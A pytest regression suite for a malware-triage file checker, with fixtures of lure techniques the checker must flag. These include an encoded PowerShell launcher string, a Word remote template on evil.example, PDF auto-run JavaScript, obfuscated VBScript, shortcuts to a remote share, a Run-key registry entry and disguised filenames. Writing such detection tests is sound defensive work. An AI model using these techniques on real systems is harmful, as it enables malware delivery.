"""File-check findings checked before release (2026-11-14): each reproduced so it cannot come back."""
import io
import os
import struct
import tarfile
import time
import zipfile
import zlib

import pytest

from zbtriage import bugreport, filecheck as fc
from zbtriage import hashlook as hl
from zbtriage.iocs import Indicator, IocSet
from zbtriage.safetext import st_line


def _rec(tmp_path, name, data, iocs=None):
    path = tmp_path / name
    path.write_bytes(data)
    return fc.fc_examine(str(path), iocs)


def _zip(tmp_path, name, members, prefix=b""):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        for n, d in members.items():
            z.writestr(n, d)
    path = tmp_path / name
    path.write_bytes(prefix + buf.getvalue())
    return str(path)


# 1. a crafted import table cannot make the import hash use unbounded memory
def test_a_huge_import_table_is_bounded():
    pe64 = False
    data = bytearray(4 * 65536 + 20 * 4096 + 64)
    # every import descriptor points at the same list of 65,536 ordinal imports
    thunks = 64
    for i in range(65535):
        struct.pack_into("<I", data, thunks + 4 * i, (1 << 31) | (i & 0xFFFF))
    desc = thunks + 4 * 65536
    for i in range(4095):
        struct.pack_into("<IIIII", data, desc + 20 * i, thunks, 0, 0, 0, thunks)
    started = time.time()
    hl._hl_imphash(bytes(data), desc, lambda rva: rva, lambda o, n=256: "lib.dll", pe64)
    assert time.time() - started < 10


# 2. padding with weak links cannot demote a real spyware server
def test_padding_with_weak_links_keeps_the_finding(tmp_path):
    inds = [Indicator("c2.spy-example.net", "cc", "primary", "domain", "t", "Predator")]
    inds += [Indicator("stalk{}.example".format(i), "stalkerware", "primary", "domain", "t", "Stalk") for i in range(9)]
    body = "<script src='https://c2.spy-example.net/x.js'></script>" + "".join(
        "<a href='https://stalk{}.example/'>x</a>".format(i) for i in range(9))
    rec = _rec(tmp_path, "page.html", body.encode(), IocSet(inds, "t.txt", None))
    assert rec["level"] == fc.FC_KNOWN and not rec["indicator_list"]


# 3. a JAR shape does not hide programs
def test_a_jar_shape_does_not_hide_programs(tmp_path):
    path = _zip(tmp_path, "files.zip", {"META-INF/MANIFEST.MF": "Manifest-Version: 1.0\n", "a.class": b"\xca\xfe",
                                        "invoice.exe": b"MZ", "open-me.lnk": b"L\x00"})
    assert fc.fc_examine(path)["level"] == fc.FC_LOOK


# 4. headers a little way in
def test_offset_headers_are_still_checked(tmp_path):
    pdf = _rec(tmp_path, "a.pdf", b"junk" * 50 + b"%PDF-1.7\n1 0 obj << /OpenAction << /S /JavaScript /JS (x) >> >>\n")
    assert "runs JavaScript as soon as it is opened" in pdf["document"]
    rtf = _rec(tmp_path, "b.doc", b"{\\rtx1 {\\object\\objdata 0102}}")
    assert any("embedded objects" in d for d in rtf["document"])
    z = _zip(tmp_path, "c.bin", {"invoice.exe": b"MZ"}, prefix=b"x")
    assert fc.fc_examine(z)["level"] == fc.FC_LOOK


# 5. Office link spellings
@pytest.mark.parametrize("rels", [
    "<Relationships><Relationship Type='x/attachedTemplate' Target='https://evil.example/t.dotm' "
    "TargetMode='External'/></Relationships>",
    '<Relationships><Relationship Type="x/attachedTemplate" Target="https://evil.example/t.dotm" '
    'TargetMode="&#69;xternal"/></Relationships>',
])
def test_office_links_in_other_spellings(tmp_path, rels):
    path = _zip(tmp_path, "a.docx", {"[Content_Types].xml": "<Types/>", "word/document.xml": "<w:document/>",
                                     "word/_rels/settings.xml.rels": rels})
    assert any("remote template" in d for d in fc.fc_examine(path)["document"])


def test_office_links_in_utf16(tmp_path):
    rels = ('<Relationships><Relationship Type="x/attachedTemplate" Target="https://evil.example/t.dotm" '
            'TargetMode="External"/></Relationships>').encode("utf-16")
    path = _zip(tmp_path, "a.docx", {"[Content_Types].xml": "<Types/>", "word/document.xml": "<w:document/>",
                                     "word/_rels/settings.xml.rels": rels})
    assert any("remote template" in d for d in fc.fc_examine(path)["document"])


# 6. PDF: a picture cannot use up the budget, and ASCIIHex is read
def test_pdf_javascript_after_a_big_picture_and_in_asciihex(tmp_path):
    picture = zlib.compress(b"\x00" * (34 * 1024 * 1024))
    script = b"<< /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >>"
    data = (b"%PDF-1.7\n1 0 obj << /Subtype /Image /Filter /FlateDecode >>\nstream\n" + picture +
            b"\nendstream\nendobj\n2 0 obj << /Type /ObjStm /Filter /FlateDecode >>\nstream\n" + zlib.compress(script) +
            b"\nendstream\nendobj\n3 0 obj << /Type /ObjStm /Filter /ASCIIHexDecode >>\nstream\n" +
            script.hex().encode() + b">\nendstream\nendobj\n")
    rec = _rec(tmp_path, "a.pdf", data)
    assert "runs JavaScript as soon as it is opened" in rec["document"]


# 7. containers that are not listed, and TAR
def test_unlisted_containers_are_incomplete_not_clean(tmp_path):
    dmg = _rec(tmp_path, "a.dmg", b"\x00" * 2048 + b"koly" + b"\x00" * 508)
    assert dmg["level"] == fc.FC_INCOMPLETE and "were not listed" in fc.fc_headline(dmg)
    rar = _rec(tmp_path, "a.rar", b"Rar!\x1a\x07\x00" + b"\x00" * 100)
    assert rar["level"] == fc.FC_INCOMPLETE


def test_a_signature_file_starting_pk_is_not_a_damaged_archive(tmp_path):
    rec = _rec(tmp_path, "AppxSignature.p7x", b"PKCX" + b"\x30\x82" + b"\x00" * 300)
    assert rec["level"] != fc.FC_LOOK


def test_a_tar_holding_a_program_is_worth_a_look(tmp_path):
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as t:
        info = tarfile.TarInfo("invoice.exe")
        info.size = 2
        t.addfile(info, io.BytesIO(b"MZ"))
    rec = _rec(tmp_path, "files.tar", buf.getvalue())
    assert rec["level"] == fc.FC_LOOK and rec["archive"]["risky"]


# 8. script tricks
@pytest.mark.parametrize("name, body", [
    ("a.vbs", b'Execute(Chr(77)&Chr(115)&Chr(103)&Chr(66))'),
    ("b.vbs", b'Set s = CreateObject("WScr" & "ipt.Shell")'),
    ("c.js", b"eval(function(p,a,c,k,e,d){return p}('x',1,1,'x'.split('|'),0,{}))"),
    ("d.jse", b"#@~^XQAAAA==encoded^#~@"),
    ("e.wsf", b'<job><script language="VBScript.Encode">#@~^</script></job>'),
])
def test_script_tricks_are_worth_a_look(tmp_path, name, body):
    assert _rec(tmp_path, name, body)["level"] == fc.FC_LOOK


# 10. PowerShell switch abbreviations
@pytest.mark.parametrize("cmd", ["powershell -en SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
                                 "powershell /enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
                                 "powershell –enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
                                 "powershell -win hidden -c x", "powershell -windowstyle 1 -c x"])
def test_powershell_switch_abbreviations(cmd):
    assert fc.fc_powershell_switches(" " + cmd)


# 11. a signature that is not valid
def test_a_broken_signature_is_worth_a_look(tmp_path):
    path = tmp_path / "setup.exe"
    path.write_bytes(b"MZ" + b"\x00" * 300)
    rec = fc.fc_examine(str(path), None, lambda _p: "bad-signature")
    assert rec["level"] == fc.FC_LOOK


# 12. a fake end-record signature inside the real one does not skip the ZIP guard
def test_the_zip_guard_finds_the_real_end_record(tmp_path):
    path = _zip(tmp_path, "a.zip", {"f{}.txt".format(i): "x" for i in range(30)})
    data = bytearray(open(path, "rb").read())
    struct.pack_into("<4s", data, len(data) - 22 + 16, b"PK\x05\x06")    # inside the offset field
    open(path, "wb").write(bytes(data))
    info = bugreport.zip_directory(path)
    assert info is not None and info[0] == 30


# 14. slow paths
def test_blank_lines_in_a_url_file_are_fast(tmp_path):
    started = time.time()
    _rec(tmp_path, "a.url", b"\n" * 65536)
    _rec(tmp_path, "a.wsh", b"\n" * 65536)
    assert time.time() - started < 3


# 15. only the [InternetShortcut] section counts
def test_a_decoy_section_in_a_url_file(tmp_path):
    rec = _rec(tmp_path, "a.url", b"[Old]\r\nURL=https://www.example.com/\r\n[InternetShortcut]\r\n"
                                  b"URL=file://\\\\203.0.113.5@80\\share\\invoice.exe\r\n")
    assert rec["level"] == fc.FC_LOOK


# 17. a chart's workbook and an e-invoice's XML are not alarms
def test_a_chart_workbook_is_not_an_embedded_program(tmp_path):
    path = _zip(tmp_path, "a.docx", {"[Content_Types].xml": "<Types/>", "word/document.xml": "<w:document/>",
                                     "word/embeddings/Microsoft_Excel_Worksheet.xlsx": b"PK"})
    assert fc.fc_examine(path)["level"] == fc.FC_CLEAN


def test_an_e_invoice_xml_is_not_an_embedded_file(tmp_path):
    rec = _rec(tmp_path, "invoice.pdf", b"%PDF-1.7\n1 0 obj << /Type /Filespec /F (factur-x.xml) /EF << /F 2 0 R >> "
                                        b">>\n2 0 obj << /Type /EmbeddedFile >>\n")
    assert "carries embedded files" not in rec["document"]


# 18. a lower-case macro storage name
def test_a_lower_case_macro_project_name(tmp_path):
    ole = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 504 + "_vba_project".encode("utf-16-le")
    assert any("macros" in d for d in _rec(tmp_path, "a.doc", ole)["document"])


# 19. trailing dots and spaces
@pytest.mark.parametrize("member", ["invoice.exe.", "invoice.exe ", "Invoice.pdf.lnk.."])
def test_trailing_dots_and_spaces_do_not_hide_programs(tmp_path, member):
    assert fc.fc_examine(_zip(tmp_path, "a.zip", {member: b"MZ"}))["level"] == fc.FC_LOOK


# false alarms found by the 12,000-file sweep
def test_a_plain_settings_file_is_named_not_flagged(tmp_path):
    tweak = _rec(tmp_path, "a.reg", b"Windows Registry Editor Version 5.00\r\n\r\n[HKEY_CURRENT_USER\\Software\\Game]\r\n"
                                    b"\"Fov\"=dword:00000060\r\n")
    assert tweak["level"] == fc.FC_CLEAN
    run = _rec(tmp_path, "b.reg", b"Windows Registry Editor Version 5.00\r\n\r\n[HKEY_CURRENT_USER\\Software\\Microsoft"
                                  b"\\Windows\\CurrentVersion\\Run]\r\n\"x\"=\"C:\\\\x.exe\"\r\n")
    assert run["level"] == fc.FC_LOOK


def test_an_app_link_shortcut_is_not_something_that_runs(tmp_path):
    assert _rec(tmp_path, "Game.url", b"[InternetShortcut]\r\nURL=steam://rungameid/1211600\r\n")["level"] == fc.FC_CLEAN
    rec = _rec(tmp_path, "x.url", b"[InternetShortcut]\r\nURL=search-ms:query=x&crumb=location:\\\\203.0.113.5\\s\r\n")
    assert rec["level"] == fc.FC_LOOK


def test_content_credentials_are_not_embedded_files(tmp_path):
    base = b"%PDF-1.7\n1 0 obj << /Names << /EmbeddedFiles << /Names [(Content Credentials) 2 0 R] >> >> >>\n"
    c2pa = _rec(tmp_path, "a.pdf", base + b"2 0 obj << /Length 4 /Type /EmbeddedFile /Subtype /application#2Fc2pa >>\n")
    assert "carries embedded files" not in c2pa["document"]
    other = _rec(tmp_path, "b.pdf", base + b"2 0 obj << /Length 4 /Type /EmbeddedFile /Subtype /application#2Fx >>\n")
    assert "carries embedded files" in other["document"]


def test_an_android_library_is_not_a_damaged_app(tmp_path):
    path = _zip(tmp_path, "lib.aar", {"AndroidManifest.xml": '<?xml version="1.0"?>\n<manifest package="x.y">'
                                      '<uses-permission android:name="android.permission.CAMERA"/></manifest>',
                                      "classes.jar": b"PK"})
    rec = fc.fc_examine(path)
    assert not (rec.get("app") or {}).get("problem") and rec["level"] != fc.FC_LOOK


def test_a_file_that_cannot_be_read_is_incomplete(tmp_path, monkeypatch):
    path = tmp_path / "locked.evtx"
    path.write_bytes(b"ElfFile\x00")
    real = open

    def refuse(p, *a, **k):
        if str(p) == str(path):
            raise PermissionError(13, "denied")
        return real(p, *a, **k)
    monkeypatch.setattr("builtins.open", refuse)
    rec = fc.fc_examine(str(path))
    assert rec["level"] == fc.FC_INCOMPLETE and "could not be read" in fc.fc_headline(rec)


# 20. names printed outside the report, and the sealed copy's own name
def test_names_outside_the_report_stay_on_one_line():
    assert st_line("a b c") == "a<U+2028>b<U+2029>c"
    assert "‮" not in fc.fc_sealed_name("report‮fdp.exe")


# what a Windows program claims to be
def test_a_famous_maker_the_signature_does_not_back():
    base = {"version_companyName": "Microsoft Corporation", "name": "update.exe"}
    assert fc.fc_program_claims(dict(base, signer="Some Other Ltd")) and \
        "signed by someone else" in fc.fc_program_claims(dict(base, signer="Some Other Ltd"))[0]
    assert "not signed" in fc.fc_program_claims(dict(base, signature="not-signed"))[0]
    assert fc.fc_program_claims(dict(base, signer="Microsoft Windows", signature="signed")) == []
    # no signature written in the file and no Windows answer (catalog-signed, or checked off Windows): no alarm
    assert fc.fc_program_claims(dict(base)) == []


def test_a_renamed_windows_tool():
    rec = {"version_originalFilename": "MSHTA.EXE", "name": "invoice.exe", "signature": "signed"}
    assert "saved under another name" in fc.fc_program_claims(rec)[0]
    assert fc.fc_program_claims(dict(rec, name="mshta.exe")) == []


@pytest.mark.skipif(not os.path.exists(r"C:\Windows\System32\mshta.exe"), reason="needs Windows")
def test_real_windows_programs(tmp_path):
    import shutil
    assert fc.fc_examine(r"C:\Windows\System32\notepad.exe")["level"] == fc.FC_CLEAN
    copy = tmp_path / "invoice.exe"
    shutil.copyfile(r"C:\Windows\System32\mshta.exe", copy)
    rec = fc.fc_examine(str(copy))
    assert rec.get("version_originalFilename", "").lower() == "mshta.exe" and rec["level"] == fc.FC_LOOK


# who signed a Mac program
def _macho(signature=None):
    """A thin 64-bit Mach-O with one load command: LC_CODE_SIGNATURE when `signature` is given."""
    if signature is None:
        cmds = struct.pack("<II", 0x19, 8)                                   # some other command
    else:
        cmds = struct.pack("<IIII", 0x1D, 16, 32 + 16, len(signature))
    header = struct.pack("<IIIIIIII", 0xFEEDFACF, 0x0100000C, 0, 2, 1, len(cmds), 0, 0)
    return header + cmds + (signature or b"")


def _code_directory(identifier=b"com.example.tool", team=b"", adhoc=True):
    body = bytearray(52)
    struct.pack_into(">IIIIII", body, 0, 0xFADE0C02, 0, 0x20200 if team else 0x20100, 0x2 if adhoc else 0, 0, 52)
    ident_at = len(body)
    body += identifier + b"\x00"
    if team:
        struct.pack_into(">I", body, 48, len(body))
        body += team + b"\x00"
    struct.pack_into(">I", body, 20, ident_at)
    struct.pack_into(">I", body, 4, len(body))
    return bytes(body)


def _superblob(*blobs):
    head_len = 12 + 8 * len(blobs)
    index, offset = b"", head_len
    for b in blobs:
        index += struct.pack(">II", 0, offset)
        offset += len(b)
    return struct.pack(">III", 0xFADE0CC0, offset, len(blobs)) + index + b"".join(blobs)


def test_mac_program_signatures():
    from zbtriage.hashlook import hl_macho
    assert hl_macho(_macho())["signature"] == "not-signed"
    adhoc = hl_macho(_macho(_superblob(_code_directory(team=b"ABCDE12345"))))
    assert adhoc["signature"] == "ad-hoc" and adhoc["mac_identifier"] == "com.example.tool"
    assert adhoc["mac_team_id"] == "ABCDE12345"


def test_a_java_class_is_not_read_as_a_universal_mac_program():
    from zbtriage.hashlook import hl_macho
    assert hl_macho(b"\xca\xfe\xba\xbe\x00\x00\x00\x34" + b"\x00" * 64) == {}


def test_a_universal_mac_program_reads_its_first_slice():
    from zbtriage.hashlook import hl_macho
    thin = _macho()
    fat = struct.pack(">II", 0xCAFEBABE, 1) + struct.pack(">IIIII", 0x0100000C, 0, 4096, len(thin), 12)
    fat += b"\x00" * (4096 - len(fat)) + thin
    assert hl_macho(fat)["signature"] == "not-signed"


def test_libraries_and_drivers_naming_a_maker_are_ordinary():
    # found by the 12,000-file sweep: apps bundle and re-sign Microsoft libraries; Windows signs Intel's inbox drivers
    assert fc.fc_program_claims({"version_companyName": "Microsoft Corporation", "name": "System.ValueTuple.dll",
                                 "signer": "HP Inc."}) == []
    assert fc.fc_program_claims({"version_companyName": "Intel Corporation", "name": "update.exe",
                                 "signer": "Microsoft Windows"}) == []
    assert fc.fc_program_claims({"version_companyName": "Microsoft Corporation", "name": "conpty.node",
                                 "signature": "not-signed"}) == []
